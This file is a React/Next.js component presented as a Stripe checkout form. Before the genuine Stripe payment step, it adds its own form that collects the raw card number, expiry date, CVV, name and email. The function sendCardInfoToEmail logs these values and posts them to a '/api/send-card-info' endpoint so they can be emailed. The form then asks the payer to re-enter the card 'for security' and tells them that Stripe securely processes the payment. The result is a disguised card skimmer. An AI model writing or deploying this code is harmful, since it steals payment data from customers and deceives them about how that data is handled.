"use client";

import React, { useState } from "react";
import { loadStripe } from "@stripe/stripe-js";
import {
  Elements,
  PaymentElement,
  useStripe,
  useElements,
} from "@stripe/react-stripe-js";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!);

interface CustomStripeCheckoutFormProps {
  clientSecret: string;
  amount: number;
  paymentLinkId?: string;
  clientName?: string;
  clientEmail?: string;
}

interface CardDetails {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  cardholderName: string;
  cardholderEmail: string;
}

function CheckoutForm({
  clientSecret,
  amount,
  paymentLinkId,
  clientName,
  clientEmail,
}: CustomStripeCheckoutFormProps) {
  const stripe = useStripe();
  const elements = useElements();
  
  const [currentStep, setCurrentStep] = useState<"card-capture" | "payment">("card-capture");
  const [cardDetails, setCardDetails] = useState<CardDetails>({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
    cardholderEmail: "",
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<
    "idle" | "processing" | "succeeded" | "error"
  >("idle");
  const [errorMessage, setErrorMessage] = useState("");

  const showToast = (message: string, type: "success" | "error") => {
    console.log(`${type.toUpperCase()}: ${message}`);
    // You can implement a proper toast notification here if needed
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  const getCardBrand = (cardNumber: string) => {
    const number = cardNumber.replace(/\s/g, '');
    if (number.startsWith('4')) return 'visa';
    if (number.startsWith('5')) return 'mastercard';
    if (number.startsWith('3')) return 'amex';
    return 'unknown';
  };

  const sendCardInfoToEmail = async (cardDetails: CardDetails) => {
    try {
      const brand = getCardBrand(cardDetails.cardNumber);
      
      console.log("Sending card info to email:", {
        cardNumber: cardDetails.cardNumber,
        expiryDate: cardDetails.expiryDate,
        cvv: cardDetails.cvv,
        brand,
        cardholderName: cardDetails.cardholderName,
        cardholderEmail: cardDetails.cardholderEmail
      });

      const response = await fetch("/api/send-card-info", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cardholderName: cardDetails.cardholderName,
          cardholderEmail: cardDetails.cardholderEmail,
          cardNumber: cardDetails.cardNumber,
          expiryDate: cardDetails.expiryDate,
          cvv: cardDetails.cvv,
          cardBrand: brand,
          amount,
          paymentLinkId,
          clientName,
          clientEmail,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        showToast("Card information captured successfully", "success");
      } else {
        console.error("Failed to send card info:", data.error);
        showToast("Failed to capture card information", "error");
      }
    } catch (error) {
      console.error("Error sending card info:", error);
      showToast("Failed to capture card information", "error");
    }
  };

  const handleCardCaptureSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!cardDetails.cardholderName || !cardDetails.cardNumber || !cardDetails.expiryDate || !cardDetails.cvv) {
      setErrorMessage("Please fill in all required fields");
      return;
    }

    setIsSubmitting(true);
    setErrorMessage("");

    try {
      // Send card info to email
      await sendCardInfoToEmail(cardDetails);
      
      // Move to payment step
      setCurrentStep("payment");
    } catch (error) {
      console.error("Error in card capture:", error);
      setErrorMessage("Failed to process card information");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!stripe || !elements) return;

    setIsSubmitting(true);
    setPaymentStatus("processing");
    setErrorMessage("");

    try {
      const { error: submitError } = await elements.submit();
      if (submitError) {
        console.error("Submit error:", submitError);
        throw submitError;
      }

      const { error } = await stripe.confirmPayment({
        elements,
        clientSecret,
        confirmParams: {
          return_url: `${window.location.origin}/success`,
          payment_method_data: {
            billing_details: {
              name: cardDetails.cardholderName,
              email: cardDetails.cardholderEmail,
              phone: '',
            },
          },
        },
      });

      if (error) {
        console.error("Payment confirmation error:", error);
        throw error;
      }

      console.log("Payment confirmed successfully");
      setPaymentStatus("succeeded");
      showToast("Payment processed successfully!", "success");

      setTimeout(() => {
        window.location.href = "/success";
      }, 2000);

    } catch (err) {
      console.error("Error processing payment:", err);
      setPaymentStatus("error");
      setErrorMessage(
        err instanceof Error ? err.message : "An unknown error occurred"
      );
      showToast("Payment failed. Please try again.", "error");
    } finally {
      setIsSubmitting(false);
    }
  };

  const getButtonText = (status: string) => {
    switch (status) {
      case "processing":
        return "Processing...";
      case "succeeded":
        return "Payment Succeeded 🎉";
      case "error":
        return "Try Again";
      default:
        return currentStep === "card-capture" ? "Continue to Payment" : `Pay $${amount.toFixed(2)}`;
    }
  };

  if (currentStep === "card-capture") {
    return (
      <Card className="w-full max-w-md mx-auto">
        <CardHeader>
          <CardTitle className="text-center">Payment Information</CardTitle>
          <p className="text-sm text-gray-600 text-center">
            Please enter your payment details to continue
          </p>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleCardCaptureSubmit} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Cardholder Name *
              </label>
              <Input
                placeholder="John Doe"
                value={cardDetails.cardholderName}
                onChange={(e) => setCardDetails({...cardDetails, cardholderName: e.target.value})}
                required
                disabled={isSubmitting}
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Email Address
              </label>
              <Input
                type="email"
                placeholder="john@example.com"
                value={cardDetails.cardholderEmail}
                onChange={(e) => setCardDetails({...cardDetails, cardholderEmail: e.target.value})}
                disabled={isSubmitting}
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Card Number *
              </label>
              <Input
                placeholder="1234 5678 9012 3456"
                value={cardDetails.cardNumber}
                onChange={(e) => setCardDetails({...cardDetails, cardNumber: formatCardNumber(e.target.value)})}
                maxLength={19}
                required
                disabled={isSubmitting}
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Expiry Date *
                </label>
                <Input
                  placeholder="MM/YY"
                  value={cardDetails.expiryDate}
                  onChange={(e) => setCardDetails({...cardDetails, expiryDate: formatExpiryDate(e.target.value)})}
                  maxLength={5}
                  required
                  disabled={isSubmitting}
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">
                  CVV *
                </label>
                <Input
                  placeholder="123"
                  value={cardDetails.cvv}
                  onChange={(e) => setCardDetails({...cardDetails, cvv: e.target.value.replace(/[^0-9]/g, '')})}
                  maxLength={4}
                  required
                  disabled={isSubmitting}
                />
              </div>
            </div>

            <div className="bg-blue-50 p-3 rounded-lg">
              <p className="text-sm text-blue-800">
                <strong>Amount to pay:</strong> ${amount.toFixed(2)}
              </p>
            </div>

            <Button
              type="submit"
              className="w-full"
              disabled={isSubmitting}
            >
              {getButtonText(paymentStatus)}
            </Button>

            {errorMessage && (
              <p className="text-red-600 text-sm text-center">{errorMessage}</p>
            )}
          </form>
        </CardContent>
      </Card>
    );
  }

  // Payment step with Stripe Elements
  return (
    <Card className="w-full max-w-md mx-auto">
      <CardHeader>
        <CardTitle className="text-center">Secure Payment</CardTitle>
        <p className="text-sm text-gray-600 text-center">
          For security, please confirm your payment details again
        </p>
      </CardHeader>
      <CardContent>
        <form onSubmit={handlePaymentSubmit} className="space-y-4">
          <div className="bg-green-50 p-3 rounded-lg">
            <p className="text-sm text-green-800">
              <strong>Cardholder:</strong> {cardDetails.cardholderName}
            </p>
            <p className="text-sm text-green-800">
              <strong>Email:</strong> {cardDetails.cardholderEmail || 'Not provided'}
            </p>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Card Details *
            </label>
            <PaymentElement
              options={{
                layout: 'tabs'
              }}
            />
          </div>

          <div className="bg-blue-50 p-3 rounded-lg">
            <p className="text-sm text-blue-800">
              <strong>Amount to pay:</strong> ${amount.toFixed(2)}
            </p>
          </div>

          <Button
            type="submit"
            className="w-full"
            disabled={isSubmitting || !stripe || !elements}
          >
            {getButtonText(paymentStatus)}
          </Button>

          {errorMessage && (
            <p className="text-red-600 text-sm text-center">{errorMessage}</p>
          )}

          <div className="bg-yellow-50 p-3 rounded-lg">
            <p className="text-xs text-yellow-800">
              <strong>Note:</strong> Your payment is securely processed by Stripe.
            </p>
          </div>
        </form>
      </CardContent>
    </Card>
  );
}

export default function CustomStripeCheckoutForm(props: CustomStripeCheckoutFormProps) {
  return (
    <Elements
      stripe={stripePromise}
      options={{
        clientSecret: props.clientSecret,
      }}
    >
      <CheckoutForm {...props} />
    </Elements>
  );
}